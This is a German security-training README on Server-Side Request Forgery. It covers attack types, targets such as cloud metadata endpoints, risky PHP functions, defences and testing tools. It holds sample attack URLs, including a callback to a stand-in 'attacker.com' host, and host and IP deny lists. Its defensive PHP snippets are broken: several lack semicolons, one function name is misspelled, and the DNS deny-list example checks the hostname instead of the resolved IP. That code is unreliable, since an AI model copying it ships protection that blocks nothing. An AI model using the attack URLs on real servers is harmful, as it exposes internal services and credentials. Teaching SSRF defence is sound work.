# 🛡️ Server-Side Request Forgery (SSRF)

## Inhaltsverzeichnis
- [Definition](#definition)
- [Typische Angriffsziele](#typische-angriffsziele)
- [Arten von SSRF](#arten-von-ssrf)
    - [Klassischer SSRF](#klassischer-ssrf)
    - [Blind SSRF](#blind-ssrf)
    - [Semi-Blind SSRF](#semi-blind-ssrf)
- [Typische Funktionen, die SSRF ermöglichen](#typische-funktionen-die-ssrf-ermöglichen)
- [Gefahren & Auswirkungen](#gefahren--auswirkungen)
- [Schutzmaßnahmen](#schutzmaßnahmen)
- [Beispiel: Blockierung privater Netze (PHP)](#beispiel-blockierung-privater-netze-php)
- [PHP-Code Beispiele](#php-code-beispiele)
    - [Blockierung privater Netze](#blockierung-privater-netze)
    - [Beispiel Allow List](#beispiel-allow-list)
    - [Beispiel Deny List](#beispiel-deny-list)
    - [Beispiel IP-Deny-List via DNS](#beispiel-ip-deny-list-via-dns)
- [Tools & Testing](#tools--testing)
- [Weitere Links](#weitere-links)

----

## Definition

`SSRF` steht für **Server-Side Request Forgery** (auf Deutsch: ***Serverseitige Anfragenfälschung***).
Dabei wird ein Server dazu gebracht, unerwünschte oder manipulierte Requests an interne oder externe Systeme zu senden.

**Das Besondere:** Die Anfrage kommt vom Server selbst (nicht vom Client/Angreifer-PC). Dadurch kann ein Angreifer auf Ressourcen zugreifen, die er normalerweise nicht erreichen dürfte – z. B. interne Netzwerke, Cloud-Metadaten oder lokale Dienste.

**Beispiel im Alltag:** Viele Web-Apps erzeugen Vorschaubilder für URLs (z. B. Messenger, Blogs). Der Server lädt dazu die Inhalte der URL herunter. Wird diese Funktion missbraucht, kann der Angreifer beliebige Ziele abrufen lassen.

---

## Funktionsweise eines SSRF-Angriffs

1. Anwendung ermöglicht Benutzereinbagen, um Ziel-URL oder Ressource für serverseitige Anfrage zu bestimmen. Eingabe kann von URL-Parameter, Formularfelder oder anderen Quellen stammen.
2. Angreifer übermittelt spezielle Anfrage und manipuliert die Eingabe so, dass es auf eine Ressource (interner Server, Backend-Dienst, API usw.) verweist, die hinter Firewalls sind.
3. Server verarbeitet die schadhafte Eingabe des Users und erstellt eine Anfrage an die Ziel-URL.
4. Bei erfolgreicher Verarbeitung stehen dem Angreifen nun die Funktionen und Daten des Serers zur Verfügung.

---

## Typische Angriffsziele

- **Interne Netze** (z. B. http://192.168.1.1/, http://10.0.0.5/)
- **Cloud-Metadaten-APIs** (z. B. AWS: http://169.254.169.254/latest/meta-data/)
- **Lokale Dienste** (http://localhost:22/, http://127.0.0.1:3306/)
- **Admin-Panels**, die nur intern erreichbar sind
- **SSRF to RCE:** Manche Dienste akzeptieren SSRF-Requests und führen z. B. Befehle aus

---

<div align="right">

[↑ zum Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Arten von SSRF

### 1. Klassischer SSRF

- Der Angreifer kontrolliert eine komplette URL und kann beliebige Ziele ansprechen.
- Beispiel:
```http
http://example.com/fetch?url=http://127.0.0.1/admin
```

### 2. Blind SSRF
- Der Angreifer sieht die Antwort nicht direkt.
- Er kann jedoch Nebenwirkungen erzeugen, z. B. DNS-Requests oder Zeitverzögerungen.
- Beispiel: Zugriff auf einen eigenen Server:
```http
http://example.com/fetch?url=http://attacker.com/callback
```

### 3. Semi-Blind SSRF
- Teilweise sichtbare Informationen (z. B. HTTP-Statuscode oder Fehlerausgabe), aber nicht der gesamte Response.

---

## Typische Funktionen, die SSRF ermöglichen
Viele Programmiersprachen und Frameworks akzeptieren URLs als Eingabeparameter:

```php
file_get_contents($url);   // kann http://, ftp://, php:// usw. öffnen
get_headers($url);         // macht GET requests
getimagesize($url);        // lädt entfernte Bilder
fopen($url, "r");          // öffnet auch Remote-Dateien
curl_exec($ch);            // klassische HTTP-Anfragen
```

---

## Gefahren & Auswirkungen

- Zugriff auf interne Admin-Interfaces
- Port-Scanning interner Netze (über Antwortzeiten)
- Zugriff auf Cloud-Metadaten (→ AWS Keys, Azure Tokens, GCP Service Accounts)
- Umgehung von Firewalls & Zugriffskontrollen
- Eskalation zu Remote Code Execution (RCE) in Kombination mit schwachen Services


---

## Schutzmaßnahmen
- **Allow-List** statt Deny-List: Nur explizit erlaubte Hosts zulassen.
- **Host/IP-Validierung** mit festen Parsern (keine eigenen Regex-Basteleien).
- **Private IP-Ranges blockieren** (`127.0.0.0/8`, `10.0.0.0/8`, `192.168.0.0/16`, `172.16.0.0/12`, `169.254.0.0/16`).
- **DNS-Rebinding verhindern** (mehrfach DNS-Auflösung und Validierung).
- **Timeouts & Limits** setzen (um Portscans zu erschweren).
- **Nur nötige Protokolle** erlauben (kein `file://`, `ftp://`, `gopher://` usw.).
- **Web Application Firewalls** (WAFs) oder Bibliotheken wie `SafeCurl`, `NoPrivateNetworkHttpClient` einsetzen.

----

<div align="right">

[↑ zum Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## PHP-Code Beispiele: 
### Blockierung privater Netze

```php
function isPrivateIP($ip) {
    return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false;
}

$input = "http://127.0.0.1/admin";
$host = parse_url($input, PHP_URL_HOST);
$ip = gethostbyname($host);

if (isPrivateIP($ip)) {
    die("Access denied: Private IPs are not allowed!");
}
```

### Beispiel Allow List
```php
$input = "https://blog.example.com/link/page.html"
$host = parse_url($input, PHP_URL_HOST)
// Value wäre "blog.example.com"
$allowedHosts = ["example.com", "blog.example.com"]
$isAllowed = in_array($host, $allowedHosts)
// Value ist true
if ($isAllowed) {file_get_contets($input);}
```

### Beispiel Deny-List
```php
$input = "https://localhoast/attack.html"
$host = parse_url($input, PHP_URL_HOST)
// Value = "localhost"
$deniedHosts = ["localhost", "badSite.com"]
$isDenied = in_array($host, $deniedHosts)
if (!$isDenied) {file_get_contents($input);}
```

### Beispiel IP-Deny-List via DNS
```php
$input = "https://webseite.com/attack.html"
$host = parse_url($input, PHP_URL_HOST)
// Value = "webseite.com"
$ip = gethostbyname($host)
//       = "127.0.0.1"
$deniedIps = ["127.0.0.1"]
$isDenied = in_array($host, $deniedIps)
//       = true
if (!$isDenied) {file_get_contents($input);}
```


## Tools & Testing

- [Burp Suite](https://portswigger.net/burp?utm_source=chatgpt.com)
- [SSRF-Testing](https://github.com/cujanovic/SSRF-Testing)
- [wfuzz](https://github.com/xmendez/wfuzz)
- [NoPrivateNetworkHttpClient](https://github.com/symfony/symfony/blob/67016b9d13d0aa164bcca122c978b2c1e1098dd6/src/Symfony/Component/HttpClient/NoPrivateNetworkHttpClient.php)
- [SafeCurl](https://github.com/vanilla/safecurl)
- Eigener DNS-Logger (z. B. dnslog.cn, interactsh) für Blind-SSRF

---

## Weitere Links
- [Media.ccc.de - SSRF](https://media.ccc.de/v/dgwk2024-56206-einfuhrung-in-ssrf-moglic#t=1431) (Video)
- [F5 - Was ist SSRF?](https://www.f5.com/de_de/glossary/ssrf)


<div align="right">

[↑ zum Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

---

## ⚠️ Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

[Disclaimer](/00-disclaimer/disclaimer.md)

--- 

📅 **Letzte Aktualisierung:** August 2025  
🤝 **Pull Requests willkommen** – Ergänzungen & Verbesserungen gern gesehen!  
